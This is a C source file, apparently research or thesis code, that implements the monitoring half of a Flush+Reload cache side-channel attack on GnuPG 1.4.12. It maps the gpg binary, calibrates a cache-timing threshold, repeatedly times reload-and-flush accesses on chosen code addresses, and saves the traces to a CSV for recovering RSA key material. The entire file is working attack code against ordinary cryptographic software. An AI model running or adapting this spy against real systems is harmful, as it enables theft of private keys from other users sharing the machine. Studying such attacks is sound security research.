#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h> //open
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //close

#include "../../Utils/src/cachetechniques.h"
#include "../../Utils/src/csvutils.h"

#define handle_error(msg) \
	do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define EXE_FILENAME "/home/root/gnupg-1.4.12/bin/gpg"

//NO_DEBUG
#define EXE_ADDRS_FILENAME "../exe_addresses.txt"
//DEBUG
//#define EXE_ADDRS_FILENAME "C:\\Users\\Ricardo-PC\\Desktop\\IST\\tese-code\\FR-LLC-RSA\\exe_addresses.txt"

#define ANALYSIS_CSV_FILENAME "../static_analysis.csv"

#define MAX_ADDRS_TO_MONITOR 10

#define MAX_TIMES_TO_MONITOR_EACH_ADDRS 50000

unsigned long obtainthreshold() {
	const int MAX_TIME = 400 / 5;
	const int MAX_WITHOUT_NOISE_ARRAY = 5 * 1024;
	const int MID_ARRAY = 2 * 1024;
	unsigned int array[MAX_WITHOUT_NOISE_ARRAY];
	unsigned int hit_counts[MAX_TIME];
	unsigned int miss_counts[MAX_TIME];
	int i;

	memset(array, -1, MAX_WITHOUT_NOISE_ARRAY * sizeof(unsigned int));
	reload(array + MID_ARRAY);
	sched_yield();
	//4MB
	for (i = 0; i < 4 * 1024 * 1024; ++i) {
		unsigned long time = reload(array + MID_ARRAY);
		hit_counts[time > (MAX_TIME - 1) ? MAX_TIME - 1 : time]++;
		sched_yield();
	}
	reloadandflush(array + MID_ARRAY);
	for (i = 0; i < 4 * 1024 * 1024; ++i) {
		unsigned long time = reloadandflush(array + MID_ARRAY);
		miss_counts[time > (MAX_TIME - 1) ? MAX_TIME - 1 : time]++;
		sched_yield();
	}
	unsigned int hit_max = 0;
	unsigned int hit_max_index = 0;
	unsigned int miss_min_index = 0;

	for (i = 0; i < MAX_TIME; ++i) {
		if (hit_max < hit_counts[i]) {
			hit_max = hit_counts[i];
			hit_max_index = i;
		}
		if (miss_counts[i] > 3 && miss_min_index == 0)
			miss_min_index = i;
	}
	unsigned int nr_times_threshold = -1UL;
	unsigned int threshold = 0;

	for (i = hit_max_index; i < miss_min_index; ++i) {
		if (nr_times_threshold > (hit_counts[i] + miss_counts[i])) {
			nr_times_threshold = hit_counts[i] + miss_counts[i];
			threshold = i * 5;
		}
	}
	return threshold;
}

long int getaddrstomonitor(const char* exeaddrsfilename, long int* out_addrs) {
	FILE* ptr_addrs = fopen(exeaddrsfilename, "r");
	if (ptr_addrs == NULL)
		handle_error("fopen_exeaddrsfilename");
	unsigned int linesize = 0, linelength = 0;
	char* line = malloc(256 * sizeof(char*));
	char* pEnd;
	long int nr_addrs = 0;
	int i;

	if ((linelength = getline(&line, &linesize, ptr_addrs)) <= 0)
		handle_error("getline_nr_addrs <= 0");
	line[linelength - 1] = '\0';
	nr_addrs = strtol(line, &pEnd, 10);
	if (*pEnd != '\r' && *pEnd != '\n' && *pEnd != '\0')
		handle_error("strtol_nr_addrs != \\r or \\n or \\0");

	long int addraux;

	for (i = 0; i < nr_addrs; ++i) {
		if ((linelength = getline(&line, &linesize, ptr_addrs)) <= 0)
			handle_error("getline_addrs <= 0");
		addraux = strtol(line, &pEnd, 0);
		if (*pEnd != '\r' && *pEnd != '\n' && *pEnd != '\0')
			handle_error("strtol_addrs != \\r or \\n or \\0");
		out_addrs[i] = addraux;
	}
	free(line);
	fclose(ptr_addrs);
	return nr_addrs;
}

int main() {
	//const unsigned long long THRESHOLD = obtainthreshold();
	//printf("%llu",aux);
	const unsigned long long THRESHOLD = 95;
	int fd_exe;
	struct stat sbuff;
	unsigned char* mapping_addr;
	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
	unsigned int nr_addrs;

	//share the executable
	fd_exe = open(EXE_FILENAME, O_RDONLY);
	if (fd_exe == -1)
		handle_error("open_exe_filename");
	if (fstat(fd_exe, &sbuff) == -1)
		handle_error("fstat");
	mapping_addr = mmap(NULL, sbuff.st_size, PROT_READ, MAP_SHARED, fd_exe, 0);
	if (mapping_addr == MAP_FAILED)
		handle_error("mmap");
	printf(".exe shared");

	//obtain the addrs to monitor
	nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME, exe_addrs);
	printf(".exe addrs obtained");

	unsigned long ptr_offset = (unsigned long) mapping_addr;
	unsigned long long analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs];

	//monitor .exe addrs
	int times,addrs_index;
	for (times = 0; times < MAX_TIMES_TO_MONITOR_EACH_ADDRS; ++times) {
		for (addrs_index = 0; addrs_index < nr_addrs; ++addrs_index) {
			analysis_array[times][addrs_index] = reloadandflush(
					((char*) exe_addrs[addrs_index] + ptr_offset));
		}
	}
	printf(".exe addrs monitored");

	//results to csv file
	arraytocsv(ANALYSIS_CSV_FILENAME, exe_addrs,
			MAX_TIMES_TO_MONITOR_EACH_ADDRS, nr_addrs, analysis_array);
	printf(".exe results to csv file");

	munmap(mapping_addr, sbuff.st_size);
	close(fd_exe);
	return 0;

}
